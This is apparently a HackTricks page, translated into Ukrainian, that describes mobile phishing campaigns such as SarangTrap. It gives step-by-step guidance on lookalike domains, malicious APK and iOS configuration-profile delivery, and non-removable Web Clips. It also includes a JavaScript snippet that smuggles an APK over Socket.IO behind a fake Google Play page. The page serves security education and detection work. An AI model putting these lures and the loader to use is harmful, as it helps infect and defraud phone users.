# Мобільний фішинг і розповсюдження шкідливих застосунків (Android та iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> На цій сторінці описано методи, які зловмисники використовують для розповсюдження **шкідливих Android APK** і **профілів конфігурації iOS** через фішинг (SEO, соціальна інженерія, підроблені магазини, застосунки для знайомств тощо).
> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025), та інших загальнодоступних досліджень.<sup>[[1]](#references)</sup>

## Схема атаки

1. **SEO/фішингова інфраструктура**
   * Зареєструйте десятки схожих доменів (знайомства, хмарний обмін файлами, автосервіс тощо).  
     – Використовуйте ключові слова місцевою мовою та емодзі в елементі `<title>`, щоб сторінка краще ранжувалася в Google.  
     – Розміщуйте інструкції зі встановлення для *Android* (`.apk`) та *iOS* на одній цільовій сторінці.
2. **Завантаження першого етапу**
   * Android: пряме посилання на *непідписаний* APK або APK із «стороннього магазину».  
   * iOS: посилання `itms-services://` або звичайне HTTPS-посилання на шкідливий профіль **mobileconfig** (див. нижче).
3. **Поведінка Android після встановлення**
   * Виконання, кероване C2, зловживання дозволами, обходи захисту від dropper-застосунків, збір даних у фоновому режимі та інші дії шкідливого ПЗ після встановлення описані на окремій сторінці про постексплуатацію Android-шкідливого ПЗ нижче.
4. **Спосіб доставки для iOS**
   * Один **профіль конфігурації мобільного пристрою** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб зарахувати пристрій до режиму нагляду, подібного до «MDM».  
   * Інструкції із соціальної інженерії:
     1. Відкрийте Settings ➜ *Завантажений профіль*.
     2. Тричі натисніть *Install* (на сторінці фішингу є знімки екрана).  
     3. Довіртеся непідписаному профілю ➜ зловмисник отримує права доступу до *Contacts* і *Photo* без перевірки App Store.
5. **Корисне навантаження iOS Web Clip (піктограма фішингового застосунку)**
   * Корисні навантаження `com.apple.webClip.managed` можуть **закріпити фішингову URL-адресу на головному екрані** з фірмовою піктограмою та назвою.
   * Web Clips можуть запускатися **на весь екран** (приховуючи інтерфейс браузера) і бути позначені як **невидалювані**, змушуючи жертву видалити профіль, щоб прибрати піктограму.<sup>[[3]](#references)</sup>
6. **Мережевий рівень**
   * Звичайний HTTP, часто через порт 80, із заголовком HOST на кшталт `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).

## Постексплуатація Android-шкідливого ПЗ

Інформацію про тактики Android-шкідливого ПЗ після встановлення, як-от C2, зловживання Accessibility, оверлеї, автоматизація ATS, завантаження DEX поетапно, преміум-SMS і закріплення в системі, дивіться тут:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Контрабанда APK через Socket.IO/WebSocket і підроблені сторінки Google Play

Зловмисники дедалі частіше замінюють статичні посилання на APK каналом Socket.IO/WebSocket, вбудованим у приманки, що імітують Google Play. Це приховує URL-адресу корисного навантаження, обходить фільтри URL-адрес і розширень та забезпечує правдоподібний процес встановлення.<sup>[[2]](#references)[[4]](#references)</sup>

Типовий потік дій клієнта, зафіксований у реальних атаках:

<details>
<summary>Підроблений завантажувач Play на Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Чому це обходить прості засоби контролю:
- Статичний URL APK не відкрито; payload відновлюється в пам’яті з WebSocket-фреймів.
- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть пропустити бінарні дані, тунельовані через WebSockets/Socket.IO.
- Краулери й URL-sandbox-и, які не виконують WebSockets, не отримають payload.

Див. також WebSocket tradecraft і засоби:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Темний бік романтики: кампанія вимагання SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Налаштування payload Web Clips для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Банківський троян, націлений на користувачів Android з Індонезії та В’єтнаму](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
